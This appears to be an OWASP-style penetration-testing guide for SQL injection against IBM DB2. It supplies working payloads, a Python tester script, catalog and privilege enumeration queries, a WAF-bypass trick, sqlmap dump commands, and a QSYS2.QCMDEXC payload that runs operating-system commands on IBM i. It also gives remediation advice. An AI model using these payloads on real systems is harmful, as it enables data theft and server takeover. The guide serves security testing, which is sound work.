---
name: wstg-inpv-05.11
description: "Testing for SQL Injection - IBM DB2"
category: input-validation
owasp_id: WSTG-INPV-05.11
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, sqli, wstg, inpv, db2, ibm, ibmi, as400]
tech_stack: [db2, ibmi, as400]
cwe_ids: [CWE-89, CWE-78]
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-inpv-02: "DB2 Injection reaching an IBM i (AS/400) backend with QSYS2.QCMDEXC() access grants direct CL command execution, escalating a data-only SQLi into full Operating System Command Execution = Critical (Host/Server Takeover)"
---

# wstg-inpv-05.11

## Test ID

WSTG-INPV-05.11

## Test Name

Testing for SQL Injection - IBM DB2

## High-Level Description

IBM DB2 is a family of relational database management systems developed by IBM, originally built for mainframes and now supporting distributed, cloud, and hybrid deployments, including IBM i (formerly AS/400). DB2-specific SQL injection testing targets its `SYSIBM`/`SYSCAT`/`SYSSTAT`/`SYSIBMADM` system catalog schemas for enumeration, uses XML-aggregation functions (`XMLAGG`, `XMLROW`, `XML2CLOB`) for error-based bulk extraction, and — on IBM i hosts specifically — can escalate to full command execution via the `QSYS2.QCMDEXC()` stored procedure, which runs arbitrary IBM i CL (Control Language) commands.

---

## What to Check

- [ ] DB2 error messages / syntax errors on single-quote injection
- [ ] `--` comment syntax accepted (truncates trailing query)
- [ ] `sysibm.sysdummy1` reachable (DB2's one-row dummy table, equivalent to Oracle's `DUAL`)
- [ ] System catalog schemas (`SYSIBM`, `SYSCAT`, `SYSSTAT`, `SYSPUBLIC`, `SYSIBMADM`, `SYSTOOLs`) accessible for enumeration
- [ ] XML-aggregation-based error/bulk extraction (`XMLAGG`, `XMLROW`, `XML2CLOB`, `XMLELEMENT`)
- [ ] Blind extraction primitives: `SUBSTR`, `CHR`, `ASCII`, bitwise functions (`BITAND`, `BITOR`, `BITXOR`, `BITNOT`, `BITANDNOT`)
- [ ] Time-based blind via heavy self-join queries (no native `SLEEP()` in DB2 — must simulate delay with expensive cross joins)
- [ ] Whether the backend is IBM i (AS/400) — if so, check for `QSYS2.QCMDEXC()` reachability (command execution)
- [ ] Quote-less WAF bypass via `CHR()` concatenation
- [ ] User/privilege/DBA enumeration via `SYSIBM.SYSUSERAUTH`, `SYSCAT.DBAUTH`, `SYSIBMADM.PRIVILEGES`

---

## How to Test

### Step 1: DB2 Detection

```bash
#!/bin/bash
TARGET="https://target.com/product?id="

echo "[*] Testing for IBM DB2 database..."

# Error-based detection
curl -s "${TARGET}'" | grep -iE "SQL0[0-9]+N|DB2 SQL Error|com\.ibm\.db2|SQLSTATE|SYSIBM"

# DB2 comment syntax
curl -s "${TARGET}1--"

# sysibm.sysdummy1 reachability (DB2's DUAL equivalent)
curl -s "${TARGET}1 UNION SELECT user FROM sysibm.sysdummy1--"

# Version fingerprint
curl -s "${TARGET}1 UNION SELECT versionnumber FROM sysibm.sysversions--"
```

### Step 2: DB2 SQLi Tester

```python
#!/usr/bin/env python3
"""
IBM DB2 SQL Injection Tester
"""

import requests
import re
import time

class DB2SQLiTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # DB2 error patterns
    DB2_ERRORS = [
        r"SQL0\d+N",
        r"DB2 SQL [Ee]rror",
        r"com\.ibm\.db2\.",
        r"SQLSTATE=\d+",
        r"SYSIBM\.",
        r"CLI Driver",
        r"DB2 SQL error:",
    ]

    # DB2-specific payloads
    DB2_PAYLOADS = {
        'detection': [
            "' AND 1=1--",
            "' UNION SELECT versionnumber,version_timestamp FROM sysibm.sysversions--",
            "1 UNION SELECT user FROM sysibm.sysdummy1--",
        ],
        'error_based': [
            "' UNION SELECT xmlagg(xmlrow(table_schema)) FROM sysibm.tables--",
            "' UNION SELECT xmlagg(xmlrow(table_schema)) FROM (SELECT DISTINCT(table_schema) FROM sysibm.tables) x--",
            "' UNION SELECT xml2clob(xmlelement(name t, table_schema)) FROM sysibm.tables--",
        ],
        'boolean_based': [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND (SELECT ascii(substr(user,1,1)) FROM sysibm.sysdummy1)>0--",
             "' AND (SELECT ascii(substr(user,1,1)) FROM sysibm.sysdummy1)<0--"),
        ],
        # No native SLEEP() in DB2 - time delay is simulated via a heavy self-join
        'time_based': [
            "' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 --",
        ],
        'command_execution_ibmi': [
            "'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')",
        ],
        'waf_bypass': [
            "SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1",
        ],
    }

    def detect_db2(self, param):
        """Detect if backend is IBM DB2"""
        print(f"[*] Detecting IBM DB2 database...")

        for payload in self.DB2_PAYLOADS['detection']:
            try:
                response = self.session.get(self.url, params={param: payload})

                for pattern in self.DB2_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] IBM DB2 database detected!")
                        return True

            except Exception:
                pass

        return False

    def test_error_based(self, param):
        """Test DB2 error-based injection via XML aggregation"""
        print(f"\n[*] Testing DB2 error-based injection (XMLAGG/XML2CLOB)...")

        for payload in self.DB2_PAYLOADS['error_based']:
            try:
                response = self.session.get(self.url, params={param: payload})

                if re.search(r'<row>|<T>', response.text):
                    print(f"[VULN] Error-based SQLi via XML aggregation!")
                    self.findings.append({
                        'type': 'DB2 Error-based SQLi (XMLAGG)',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception:
                pass

        return False

    def test_time_based(self, param):
        """Test DB2 time-based blind injection via heavy self-join"""
        print(f"\n[*] Testing DB2 time-based injection (heavy self-join, no native SLEEP)...")

        start = time.time()
        self.session.get(self.url, params={param: 'test'}, timeout=30)
        baseline = time.time() - start

        for payload in self.DB2_PAYLOADS['time_based']:
            try:
                start = time.time()
                self.session.get(self.url, params={param: payload}, timeout=30)
                response_time = time.time() - start

                if response_time > baseline + 3:
                    print(f"[VULN] Time-based SQLi (heavy self-join delay)!")
                    print(f"  Payload: {payload}")
                    print(f"  Response time: {response_time:.2f}s")
                    self.findings.append({
                        'type': 'DB2 Time-based Blind SQLi',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                print(f"[VULN] Time-based SQLi (timeout)!")
                self.findings.append({
                    'type': 'DB2 Time-based Blind SQLi',
                    'payload': payload,
                    'severity': 'Critical'
                })
                return True
            except Exception:
                pass

        return False

    def test_command_execution(self, param):
        """Test DB2 command execution via QSYS2.QCMDEXC (IBM i / AS-400 only)"""
        print(f"\n[*] Testing DB2 command execution (QSYS2.QCMDEXC, IBM i only)...")

        for payload in self.DB2_PAYLOADS['command_execution_ibmi']:
            try:
                response = self.session.get(self.url, params={param: payload})

                if response.status_code == 200:
                    print(f"[POSSIBLE VULN] QCMDEXC executed - manual verification of output required")
                    self.findings.append({
                        'type': 'DB2 Command Execution (IBM i QSYS2.QCMDEXC)',
                        'payload': payload,
                        'severity': 'Critical'
                    })

            except Exception:
                pass

        return False

    def run_tests(self, param='id'):
        """Run all DB2 SQLi tests"""
        if self.detect_db2(param):
            self.test_error_based(param)
            self.test_time_based(param)
            self.test_command_execution(param)

        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("IBM DB2 SQL INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo DB2 SQLi vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:90]}")

# Usage
tester = DB2SQLiTester("https://target.com/product")
tester.run_tests(param='id')
```

### Step 3: DB2 Data Enumeration

```sql
-- DBMS version (multiple methods)
select versionnumber, version_timestamp from sysibm.sysversions;
select service_level from table(sysproc.env_get_inst_info()) as instanceinfo
select getvariable('sysibm.version') from sysibm.sysdummy1
select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo
select service_level,bld_level from sysibmadm.env_inst_info

-- Current user
select user from sysibm.sysdummy1
select session_user from sysibm.sysdummy1
select system_user from sysibm.sysdummy1

-- Current database
select current server from sysibm.sysdummy1

-- OS info
select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info

-- List databases
SELECT distinct(table_catalog) FROM sysibm.tables
SELECT schemaname FROM syscat.schemata;

-- List columns
SELECT name, tbname, coltype FROM sysibm.syscolumns

-- List tables
SELECT table_name FROM sysibm.tables
SELECT name FROM sysibm.systables
SELECT tbname FROM sysibm.syscolumns WHERE name='username'
```

### DB2 Default Databases / System Catalogs

| Name      | Description                                                                                       |
| --------- | --------------------------------------------------------------------------------------------------- |
| SYSIBM    | Core system catalog tables storing metadata for database objects.                                   |
| SYSCAT    | User-friendly views for accessing metadata in the SYSIBM tables.                                     |
| SYSSTAT   | Statistics tables used by the DB2 optimizer for query optimization.                                  |
| SYSPUBLIC | Metadata about objects available to all users (granted to PUBLIC).                                   |
| SYSIBMADM | Administrative views for monitoring and managing the database system.                                |
| SYSTOOLs  | Tools, utilities, and auxiliary objects provided for database administration and troubleshooting.    |

---

## Tools

| Tool          | Purpose                    |
| -------------- | ---------------------------- |
| SQLMap         | Automated DB2 SQLi (`--dbms=db2`) |
| db2 CLI        | IBM DB2 command line client   |
| IBM Data Studio | GUI client                   |
| Burp Suite     | Manual testing                |

---

## Example Commands/Payloads

### Detection (curl)

```bash
TARGET="https://target.com/product"

# DB2-specific error trigger
curl -s "$TARGET?id=1'" | grep -Ei "SQL0[0-9]+N|DB2 SQL Error|SQLSTATE"

# sysibm.sysdummy1 fingerprint (DB2's DUAL equivalent)
curl -s "$TARGET?id=1 UNION SELECT user,NULL FROM sysibm.sysdummy1--"
```

### SQLMap (DB2)

```bash
sqlmap -u "https://target.com/product?id=1" --dbms=db2 --banner
sqlmap -u "https://target.com/product?id=1" --dbms=db2 --dbs
sqlmap -u "https://target.com/product?id=1" --dbms=db2 -D target_db -T users --dump
```

### DB2 Comments

| Type | Description |
| ---- | ------------- |
| `--` | SQL comment  |

### DB2 Error Based (XML aggregation bulk extraction)

```sql
-- Returns all in one xml-formatted string
select xmlagg(xmlrow(table_schema)) from sysibm.tables

-- Same but without repeated elements
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)

-- Returns all in one xml-formatted string.
-- May need CAST(xml2clob(… AS varchar(500)) to display the result.
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables
```

### DB2 Blind Based

| Description     | SQL Query                                                                                                                             |
| ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| Substring        | `select substr('abc',2,1) FROM sysibm.sysdummy1`                                                                                        |
| ASCII value      | `select chr(65) from sysibm.sysdummy1`                                                                                                  |
| CHAR to ASCII    | `select ascii('A') from sysibm.sysdummy1`                                                                                               |
| Select Nth Row   | `select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only` |
| Bitwise AND      | `select bitand(1,0) from sysibm.sysdummy1`                                                                                              |
| Bitwise AND NOT  | `select bitandnot(1,0) from sysibm.sysdummy1`                                                                                           |
| Bitwise OR       | `select bitor(1,0) from sysibm.sysdummy1`                                                                                               |
| Bitwise XOR      | `select bitxor(1,0) from sysibm.sysdummy1`                                                                                              |
| Bitwise NOT      | `select bitnot(1,0) from sysibm.sysdummy1`                                                                                              |

### DB2 Time Based

DB2 has no native `SLEEP()`. Heavy self-join queries are used instead — if the user starts with ascii 68 (`'D'`), the heavy query executes, delaying the response:

```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68
```

### DB2 Command Execution (IBM i / AS-400 only)

The `QSYS2.QCMDEXC()` procedure/scalar function executes arbitrary IBM i CL commands:

```sql
'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')
```

When output is not returned directly, redirect to a file and read it back:

```sql
QSYS2.QCMDEXC('QSH CMD(''system dspusrprf PROFILE > /tmp/qsh_output.txt 2>&1'')')
SELECT LINE FROM TABLE(QSYS2.IFS_READ_UTF8('/tmp/qsh_output.txt',2147483647,'NONE'))
```

### DB2 WAF Bypass (avoiding quotes)

```sql
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
```

### DB2 Accounts and Privileges

| Description          | SQL Query                                                                        |
| --------------------- | ----------------------------------------------------------------------------------- |
| List users            | `select distinct(grantee) from sysibm.systabauth`                                   |
| List users            | `select distinct(definer) from syscat.schemata`                                     |
| List users            | `select distinct(authid) from sysibmadm.privileges`                                 |
| List users            | `select grantee from syscat.dbauth`                                                 |
| List privileges       | `select * from syscat.tabauth`                                                       |
| List privileges       | `select * from SYSIBM.SYSUSERAUTH` (list DB2 system privileges)                     |
| List DBA accounts     | `select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'`             |
| List DBA accounts     | `select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'`    |
| Location of DB files  | `select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'`                |

### Detection Pattern

| Signal | Meaning |
| ------ | ------- |
| `SQL0<n>N` / `DB2 SQL Error` / `SQLSTATE=` in response | Error-based SQLi, confirms DB2 backend |
| `sysibm.sysdummy1` query returns a value | Confirms DB2's one-row dummy table is reachable (DUAL equivalent) |
| `<row>`/`<T>` XML fragment returned in output | Error/UNION-based bulk extraction via `XMLAGG`/`XML2CLOB` working |
| Response delayed only when guessed character byte matches (heavy self-join) | Time-based blind SQLi (simulated delay, no native `SLEEP()`) |
| `QCMDEXC` call returns 200 and redirected output file is readable via `QSYS2.IFS_READ_UTF8` | Confirmed OS command execution — target is IBM i (AS/400) |

---

## Remediation

```java
// Java - JDBC PreparedStatement
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();
```

```python
# Python - ibm_db parameterized query
import ibm_db

stmt = ibm_db.prepare(conn, "SELECT * FROM users WHERE id = ?")
ibm_db.execute(stmt, (user_id,))
```

Additional hardening:
- Revoke `EXECUTE` on `QSYS2.QCMDEXC` from any profile used by application connections on IBM i hosts — this single grant is the difference between a data-only SQLi and full CL command execution.
- Restrict access to `SYSIBM`/`SYSCAT`/`SYSIBMADM` catalog views for application service accounts where not required.
- Apply least-privilege authorities (`SYSADMAUTH`, `CONTROLAUTH`) — avoid running application queries under an account with `SYSADMAUTH='Y'`.

---

## Risk Assessment

| Finding                                       | CVSS | Severity |
| ------------------------------------------------ | ---- | -------- |
| DB2 SQLi with QSYS2.QCMDEXC command execution (IBM i) | 9.8  | Critical |
| DB2 Error-based SQLi (XMLAGG bulk extraction)     | 8.6  | High     |
| DB2 Time-based Blind SQLi                          | 7.5  | High     |

---

## CWE Categories

| CWE ID     | Title                          |
| ---------- | --------------------------------- |
| **CWE-89** | SQL Injection                     |
| **CWE-78** | OS Command Injection (via QCMDEXC on IBM i) |

---

## References

- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [PayloadsAllTheThings - DB2 Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
- [DB2 SQL injection cheat sheet - Adrián](https://web.archive.org/web/20211026090110/https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
- [Pentestmonkey's DB2 SQL Injection Cheat Sheet](https://web.archive.org/web/20260226035803/https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
- [QSYS2.QCMDEXC() - IBM Support](https://web.archive.org/web/20230305185053/https://www.ibm.com/support/pages/qsys2qcmdexc)

---

## Checklist

```
[ ] DB2 database detected (SQL0<n>N / SQLSTATE / sysibm.sysdummy1)
[ ] System catalog enumeration tested (SYSIBM/SYSCAT/SYSSTAT/SYSIBMADM)
[ ] Error-based extraction tested (XMLAGG/XMLROW/XML2CLOB)
[ ] Blind-based extraction tested (SUBSTR/ASCII/CHR/bitwise functions)
[ ] Time-based blind tested (heavy self-join delay technique)
[ ] Quote-less WAF bypass tested (CHR() concatenation)
[ ] Backend checked for IBM i / AS-400 (QSYS2.QCMDEXC command execution path)
[ ] User/privilege/DBA enumeration tested
[ ] Findings documented
```
